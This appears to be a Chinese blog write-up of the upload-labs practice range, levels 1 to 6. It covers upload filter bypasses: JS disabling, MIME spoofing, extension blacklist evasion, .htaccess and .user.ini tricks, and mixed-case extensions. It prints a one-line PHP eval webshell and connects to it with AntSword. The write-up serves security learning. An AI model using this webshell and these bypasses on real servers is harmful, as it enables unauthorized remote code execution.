---
title: upload-labs做题记录
date: 2026-09-22 20:05:21
tags:
- Web
- 文件上传漏洞
- 靶场实战
---

**upload-labs靶场通关**

### <font size="5">**前言：如何确认自己真的通关了？**</font>

1. 访问执行：复制上传后的文件路径，在浏览器访问。如果看到 phpinfo 页面或者代码没有直接以文本形式泄露，说明解析成功。
2. 工具连接：对于一句话木马，用蚁剑或菜刀尝试连接。如果显示“连接成功”并能执行命令，才算真正拿到了服务器的控制权。

。。。。。。。。。。。。。。。。。。。。。。。。



**Pass01**

上传一个3.php发现弹出弹窗, 考察 JS 前端验证绕过

![屏幕截图 2026-09-22 193349](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/22bf63a43f433334e5e5dd64c12755bf-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20193349.png)

**方式一：禁用javascript**

### <font size="5">Firefox</font>

1. 地址栏输入 `about:config`
2. 搜索 `javascript.enabled`
3. 切换为 `false`
4. 刷新页面

再次上传webshell.php(3.php),疑似上传成功，打开蚁剑连接站点查看，确实上传成功

![屏幕截图 2026-09-22 200221](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/460e854b377f07c58c033bceae094d9d-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20200221.png)



**方式二：burpsuite抓包**

将webshell2.php后缀改为.jpg，burpsuite抓包时再改回原.php后缀，蚁剑查看成功上传

![屏幕截图 2026-09-22 205133](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/9f6e3436280b5ff74c9e7cc086ae0f2d-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20205133.png)

![屏幕截图 2026-09-22 205424](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/6aeadcd288575821c511b0f531d6ff05-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20205424.png)

![屏幕截图 2026-09-22 205223](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/cfc5186de5725d010cfe9db23f005706-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20205223.png)





**Pass02**

能上传.jpg图片；改了很久的文件后缀，结果都不行，查看提示发现想错了。本题考查MIME类型校验绕过

![屏幕截图 2026-09-22 212316](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/374cdc6133cd8a918e51007851534036-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20212316.png)



把Content-Type: application/octet-stream改成image/jpeg就好了



![屏幕截图 2026-09-22 212240](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/6b557f59146da0659f1c209e36ee4426-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20212240.png)

。。。。。。。。。。。。。。。。。。。。。。。。

![屏幕截图 2026-09-22 212203](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/d46a2eda902d47e8622b70b873d8bcdf-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20212203.png)

。。。。。。。。。。。。。。。。。。。。。。。。。

![](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/97c93a3b7062f715d24c4a15c4a5f2b5-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20212302.png)



**Pass03**

传入.php文件后发现考察黑名单绕过：

![屏幕截图 2026-09-23 213939](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/23/4e5f8af4f923ebc682f34aadf8da1036-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-23%20213939.png)

试验之后发现.pphphp，.php3，.php5，.phtml等等都行

-然后发现使用蚁剑连不上，查看上传文件才知道文件被重命名了

![屏幕截图 2026-09-23 220154](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/23/233c1d09981c88b874bd9312da75e85a-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-23%20220154.png)

-知道了文件名之后尝试用蚁剑再次连接，显示数据为空。

查资料发现：

**Apache**：默认配置里通常只解析 `.php`，`.phtml` 需要手动添加 `AddType application/x-httpd-php .phtml` 才会生效。

**Nginx**：默认只把请求转发给 PHP-FPM 处理 `.php` 文件，`.phtml` 会被当作静态文件直接返回源码。

即：服务器没有把 `.phtml` 当作 PHP 文件解析，而是当成普通文本文件返回了。



新版 PHPStudy（如 8.x）的 Apache 默认已经不再使用传统的 `mod_php` 模块来处理 PHP 请求，而是改用了 `mod_fcgid`（FastCGI）。打开 Apache 的 `httpd.conf`,找到之前添加 `AddType` 的地方，用下面这套配置替换它：

```
# 1. 告诉 Apache 哪些后缀应交给 fcgid 处理

AddHandler fcgid-script .php .php5 .phtml

# 2. 设置 PHP 运行环境（指向你的 php 目录）

FcgidInitialEnv PHPRC "D:/../php/phpx.x.xnts"

# 3. 为每个后缀指定对应的 PHP 解释器路径

FcgidWrapper "D:/../php/phpx.x.xnts/php-cgi.exe" .php
FcgidWrapper "D:/./php/phpx.x.xnts/php-cgi.exe" .php5
FcgidWrapper "D:/...../php/phpx.x.xnts/php-cgi.exe" .phtml
```

![image-20260924142155495](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/24/7bfbf00ff01341ab928d357fdc1c8bab-image-20260924142155495.png)

**Pass04**

![屏幕截图 2026-09-24 194539](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/24/11cf9c006f4451671d9ddacf06fc585d-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20194539.png)

今天调好了burpsuite的fuzz测试功能，试用一下。

ps：测试的时候最好关掉安全中心的“病毒与威胁保护”设置。

发现14个长度1000的响应，逐一测试。

测试成功的有三个：.aspx.png ; .jsp` ; .jsp!

查资料发现，之前自己的个人理解存在一个误区：php语言文件后缀换.jsp，.asa绕过，这在大部分情况下是错误的做法。

- ```
  如果你把一个内容为 <?php ... ?> 的文件命名为 .jsp：
  
  - 服务器会把它交给 JSP 引擎；
  - JSP 引擎看不懂 <?php ?>，会当成模板文本原样输出，或者直接报错；
  - PHP 代码不会被执行。
  ```

  

所以对上述文件后缀进行更改：

```
.aspx.png -> .php.png
.jsp` -> .php`
.jsp! -> .php!
```

最终结果：

![屏幕截图 2026-09-24 121057](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/24/092a13b9846e8369b8e0c6430580d790-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-24%20121057.png)

emm,貌似没什么用，看看源码，用.htaccess覆盖试试：

```
.htaccess 介绍

.htaccess 是 Apache HTTP Server 专属的分布式配置文件（也叫“分散式组态档”）。它的核心作用是：让没有服务器 root 权限的普通用户，也能对自己目录下的 Apache 行为进行配置。

生效条件：服务器主配置中 AllowOverride 允许相应指令，且通常需 AllowOverride All
```

-FastCGI 

模式下对应的.htaccess文件写法

```
<FilesMatch "\.png$">
    AddHandler fcgid-script .png
    # 把 .png 后缀的文件标记为 FastCGI 脚本
    FcgidWrapper "php-cgi.exe完整路径" .png
    # 执行 .png 脚本时，具体调用哪个程序
</FilesMatch>
```

成功。

![image-20260925101152021](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/3cf127b17cd362550ab02ea0f494fbdb-image-20260925101152021.png)



**Pass05**

.htaccess文件不让上传了，fuzz测试没有明显切入点。

手工测试：

![image-20260924200248067](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/24/cfd16a273a0cb1242aad55676686bcde-image-20260924200248067.png)

貌似没什么用，看看源码，发现去.和去空没有循环。

用点号绕过试试看：xxx.php. .

![屏幕截图 2026-09-25 103458](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/4a26aab8c72f57b2b32f5597c5f22d09-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-25%20103458.png)

可行（xxx.php. . -> xxx.php. ->xxx.php）

![image-20260925104120303](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/536951b48cab7cf0107eaec3a5d3e30f-image-20260925104120303.png)



还有一种方法：.user.ini文件上传：

```
一、什么是 .user.ini
.user.ini 是 PHP 提供的一种用户级配置文件，从 PHP 5.3.0 开始引入。
它的设计目的是为了让普通用户（非管理员）也能修改部分 PHP 配置，而不需要去改动全局的 php.ini。

本题：.user.ini 让指定的那一个文件被 include 进 PHP

二、auto_prepend_file 是什么
ini:
auto_prepend_file = <filename>

含义
自动前置文件：在执行任何 PHP 脚本之前，PHP 会先自动包含（include）这个指定的文件。

执行流程
请求 index.php
      ↓
先执行 auto_prepend_file 指定的文件
      ↓
再执行 index.php 本身

三、auto_append_file 是什么
ini
auto_append_file = <filename>

含义
自动后置文件：在执行完任何 PHP 脚本之后，PHP 会自动包含这个指定的文件。
执行流程
请求 index.php
      ↓
执行 index.php 本身
      ↓
再执行 auto_append_file 指定的文件
```

.txt：

```
<?php @eval($_POST['cmd']); ?>
```

.user.ini：

```
auto_prepend_file=test.txt
```

成功。

![屏幕截图 2026-09-25 105628](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/22cbb312704c04c9d2f3adb0fd09cf62-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-25%20105628.png)



图片马同样可以：

![image-20260925112536933](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/0284614c6ef9da05e5187f8767bb904b-image-20260925112536933.png)

(不要看到网页上显示一堆乱码就认为失败，具体要看蚁剑能不能连)



**Pass06**

fuzz一下，没发现有用的东西。

手工尝试，发现大小写混合能够上传。(.Php)

![image-20260925115614040](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/36953ea2248d98d1f88dff794a22e0e3-image-20260925115614040.png)

```
FastCGI模式下（非FastCGI不用这一步）：

配置里同时存在两条针对 .php 后缀的指令：

    AddHandler fcgid-script .php .phtml ...
这条指令告诉 Apache：“凡是看到 .php（以及列出的其他后缀），就把它们当作 FastCGI 脚本处理。” 注意，AddHandler 对大小写通常不敏感，所以它也会把 .Php 识别为 FastCGI 脚本。

    FcgidWrapper "D:/xxx/php-cgi.exe" .php：这条指令告诉 mod_fcgid 模块：“当处理 .php 后缀的文件时，请调用这个具体的 php-cgi.exe 程序。”

问题就出在这里。AddHandler 把 .Php 交给了 FastCGI 系统，但 FcgidWrapper 只为小写的 .php 指定了具体的 PHP 解释器路径。当 Apache 试图处理一个 .Php 文件时，它进入了 FastCGI 处理流程，却找不到对应的包装器（Wrapper）来执行它，进程创建失败，最终抛出 500 错误。
```

![106c6ae6c5c24b40f6b285d5e7c3f5a6_720](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/3af8c73ec4fe3ae9254248876cb9fcf8-106c6ae6c5c24b40f6b285d5e7c3f5a6_720.png)

添加.Php后重启Apache就可以了。成功连接。

![image-20260925120127012](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/25/d29b5086315095364f2021f82b72ddef-image-20260925120127012.png)
